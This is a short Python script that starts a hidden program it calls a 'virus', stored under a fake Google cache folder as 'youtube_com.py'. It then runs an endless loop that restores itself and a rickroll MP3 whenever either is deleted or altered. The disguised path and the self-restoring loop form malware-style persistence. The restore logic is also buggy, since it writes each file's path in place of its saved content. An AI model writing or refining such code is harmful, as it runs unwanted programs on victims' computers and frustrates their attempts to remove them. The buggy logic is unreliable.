import os, time, sys
from multiprocessing import Process

PYTHON_COMMAND = sys.executable
home_dir = os.path.expanduser("~")

# --- FIX 1: Use os.path.join for path construction ---
music_file = os.path.join(home_dir, "Music", "youtube_com-watch-dQw4w9WgXcQ.mp3")
cache_file = os.path.join(home_dir, "Downloads", "Google_Stable_x64", "assets", "cache", "youtube_com-watch-dQw4w9WgXcQ.mp3")

print("Checkpoint1")
files_to_backup = [
  (__file__, __file__),
  (cache_file, music_file)
]
print("Checkpoint2")

backuped_files = [open(path, "r").read() for path, _ in files_to_backup]

virus_path = os.path.join(home_dir, "Downloads", "Google_Stable_x64", "assets", "cache", "youtube_com.py")

print("Checkpoint3")
# --- FIX 2: Quote the Python command and the script path for os.system ---
start_virus = lambda: os.system(f'"{PYTHON_COMMAND}" "{virus_path}"')
virus_thread = Process(target=start_virus)
virus_thread.start()


print("Checkpoint4")
while True:
  for index, file_paths in enumerate(files_to_backup):
    backup = backuped_files[index]
    for path in file_paths:
      if not os.path.exists(path) or open(path, "r").read() != backup:
        with open(path, "w") as file:
          file.write(path)
  time.sleep(1)